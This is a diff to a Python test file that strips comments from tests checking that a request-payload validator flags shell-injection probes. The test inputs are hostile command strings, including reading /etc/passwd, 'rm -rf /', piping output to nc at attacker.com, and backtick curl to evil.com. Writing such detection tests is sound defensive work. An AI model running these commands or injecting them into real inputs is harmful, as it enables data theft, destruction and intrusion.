@@ -290,7 +290,6 @@ def test_payload_keeps_search_query_clean():
 
 
 def test_payload_marks_or_chain_probe_text():
-    # || before a known command — OR-chaining shell injection
     ctx = RequestContext(
         identity="u1",
         payload="foo || cat /etc/passwd",
@@ -306,7 +305,6 @@ def test_payload_marks_or_chain_probe_text():
 
 
 def test_payload_marks_or_chain_rm_probe_text():
-    # || before rm — destructive OR-chaining probe
     ctx = RequestContext(
         identity="u1",
         payload="1 || rm -rf /",
@@ -322,7 +320,6 @@ def test_payload_marks_or_chain_rm_probe_text():
 
 
 def test_payload_marks_pipe_nc_probe_text():
-    # bare | piping output to nc — data-exfiltration probe
     ctx = RequestContext(
         identity="u1",
         payload="input | nc attacker.com 1234",
@@ -338,7 +335,6 @@ def test_payload_marks_pipe_nc_probe_text():
 
 
 def test_payload_marks_pipe_bash_probe_text():
-    # bare | piping directly into bash
     ctx = RequestContext(
         identity="u1",
         payload="search | bash",
@@ -354,7 +350,6 @@ def test_payload_marks_pipe_bash_probe_text():
 
 
 def test_payload_marks_backtick_id_probe_text():
-    # backtick substitution with id — classic recon probe
     ctx = RequestContext(
         identity="u1",
         payload="`id`",
@@ -370,7 +365,6 @@ def test_payload_marks_backtick_id_probe_text():
 
 
 def test_payload_marks_backtick_whoami_probe_text():
-    # backtick substitution with whoami — recon probe
     ctx = RequestContext(
         identity="u1",
         payload="`whoami`",
@@ -386,7 +380,6 @@ def test_payload_marks_backtick_whoami_probe_text():
 
 
 def test_payload_marks_backtick_curl_probe_text():
-    # backtick substitution with curl — remote-fetch probe
     ctx = RequestContext(
         identity="u1",
         payload="`curl http://evil.com`",
@@ -402,7 +395,6 @@ def test_payload_marks_backtick_curl_probe_text():
 
 
 def test_payload_keeps_pipe_filter_param_clean():
-    # pipe used as a value separator with no command word — must not trigger
     ctx = RequestContext(
         identity="u1",
         payload="price|filter=low",
